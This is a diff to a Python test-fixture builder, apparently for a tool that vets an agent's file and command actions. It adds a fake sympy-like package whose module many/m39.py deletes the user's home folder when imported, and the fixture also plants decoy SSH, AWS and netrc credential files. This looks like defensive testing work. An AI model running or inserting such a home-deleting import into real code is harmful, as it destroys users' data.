@@ -46,6 +46,7 @@ def build_world(base, name="proj"):
     for name, text in files.items():
         (project / name).write_text(text)
     code_files(project, home)
+    package_files(project)
     for name, text in {".ssh/id_rsa": "KEY", ".ssh/id_rsa.pub": "PUB", ".ssh/id_ed25519": "KEY",
                        ".aws/credentials": "[default]", ".bashrc": "", ".netrc": "",
                        ".docker/config.json": "{}",
@@ -101,6 +102,29 @@ def code_files(project, home):
     (py / "link_ok.py").symlink_to("ok.py")
     (py / "linked").symlink_to(".", target_is_directory=True)
     (home / "x.py").write_text("print(1)\n")
+
+
+def package_files(project):
+    """A large package laid out like sympy (#434): `mathlib/__init__.py` and `mathlib/combinatorics/
+    __init__.py` import 40 names each from a few modules, and `mathlib/many/__init__.py` imports 40
+    modules of its own, the last one deleting your home folder."""
+    names = [f"N{i}" for i in range(40)]
+    pkg = project / "mathlib"
+    for d in ("combinatorics", "many"):
+        (pkg / d).mkdir(parents=True)
+    texts = {
+        "__init__.py": "from mathlib.core import (\n    " + ",\n    ".join(names) + ",\n)\n"
+                       "from mathlib.core import Max, Min\nfrom .combinatorics import *\n",
+        "core.py": "".join(f"{n} = {i}\n" for i, n in enumerate(names)) + "Max = max\nMin = min\n",
+        "combinatorics/__init__.py": "".join(f"from mathlib.combinatorics.perm{i % 4} import {n}\n"
+                                             for i, n in enumerate(names)),
+        **{f"combinatorics/perm{i}.py": "".join(f"{n} = 1\n" for n in names) for i in range(4)},
+        "many/__init__.py": "".join(f"import m{i}\n" for i in range(40)),
+        **{f"many/m{i}.py": "x = 1\n" for i in range(39)},
+        "many/m39.py": "import os, shutil\nshutil.rmtree(os.path.expanduser('~'))\n",
+    }
+    for name, text in texts.items():
+        (pkg / name).write_text(text)
 
 
 def decide(project, tool, value, cfg=None, session=None, approvals=None):
